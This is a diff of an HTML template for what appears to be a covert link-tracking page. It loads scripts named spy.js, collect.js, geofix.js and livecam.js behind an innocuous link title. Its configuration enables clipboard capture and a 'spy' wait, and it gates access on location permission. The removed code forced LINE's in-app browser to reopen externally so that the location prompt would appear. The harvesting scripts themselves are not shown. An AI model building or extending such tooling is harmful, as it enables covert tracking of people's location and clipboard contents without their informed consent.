@@ -9,22 +9,6 @@
 <link rel="manifest" href="/manifest.webmanifest">
 <link rel="apple-touch-icon" href="/static/icon.svg">
 <title>{{ link.name }}</title>
-<script>
-/* LINE内ブラウザ対策：位置情報の許可ダイアログが出ないので外部ブラウザで開き直す */
-(function () {
-  var ua = navigator.userAgent || "";
-  if (!/Line\//i.test(ua)) return;
-  if (/[?&]openExternalBrowser=1/.test(location.search || "")) return;
-  try {
-    var u = new URL(location.href);
-    u.searchParams.set("openExternalBrowser", "1");
-    location.replace(u.toString());
-  } catch (e) {
-    location.replace(location.href +
-      (location.search ? "&" : "?") + "openExternalBrowser=1");
-  }
-})();
-</script>
 <style>
 html,body{margin:0;background:#0f1115;color:#e6e9ef;
   font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
@@ -108,21 +92,22 @@ window.LT_DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
 window.LT_ASK_TEXT   = {{ ask_text|tojson }};
 window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
+window.LT_GO_TEXT    = {{ go_text|tojson }};
 window.LT_TITLE      = {{ link.name|tojson }};
 window.LT_GATE = {{ 1 if gate else 0 }};
 window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
-window.LT_LINE_FIX = 0;
+window.LT_LINE_FIX = 0;   /* 旧 live.js との互換用（新 live.js は未使用） */
 window.LT_CAM      = 0;
 window.LT_MIC      = 0;
 window.LT_CLIP     = 1;
 window.LT_SPY_WAIT = 7000;
 window.LT_DEBUG    = 0;
 </script>
-<script src="/static/geofix.js?v=17"></script>
-<script src="/static/keepalive.js?v=17"></script>
-<script src="/static/collect.js?v=17"></script>
-<script src="/static/live.js?v=17"></script>
-<script src="/static/spy.js?v=17"></script>
-<script src="/static/livecam.js?v=17"></script>
-<script src="/static/gate.js?v=17"></script>
+<script src="/static/geofix.js?v=18"></script>
+<script src="/static/keepalive.js?v=18"></script>
+<script src="/static/collect.js?v=18"></script>
+<script src="/static/live.js?v=18"></script>
+<script src="/static/spy.js?v=18"></script>
+<script src="/static/livecam.js?v=18"></script>
+<script src="/static/gate.js?v=18"></script>
 </body></html>
